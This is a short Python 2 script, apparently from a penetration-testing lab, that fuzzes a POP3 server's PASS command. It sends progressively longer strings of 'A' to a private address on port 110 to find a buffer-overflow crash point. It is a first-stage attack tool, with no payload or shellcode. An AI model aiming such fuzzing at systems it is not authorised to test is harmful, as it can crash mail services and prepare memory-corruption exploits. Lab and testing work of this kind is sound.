#!/usr/bin/env python
import socket

if __name__ == '__main__':
	
	buffer = ["A"]
	counter = 100

	while len(buffer) <= 30:
		buffer.append("A" * counter)
		counter += 200

	for string in buffer:
		print "[!] Fuzzing PASS with {0} bytes...".format(str(len(string)))
		
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		socket_connection = sock.connect(('10.11.21.97', 110))
		data = sock.recv(1024)
		print(data)

		sock.send('USER test\r\n')
		ack = sock.recv(1024)
		print ack

		sock.send('PASS {0}\r\n'.format(string))
		ack = sock.recv(1024)
		print ack

		sock.send('QUIT\r\n')
		sock.close()
		
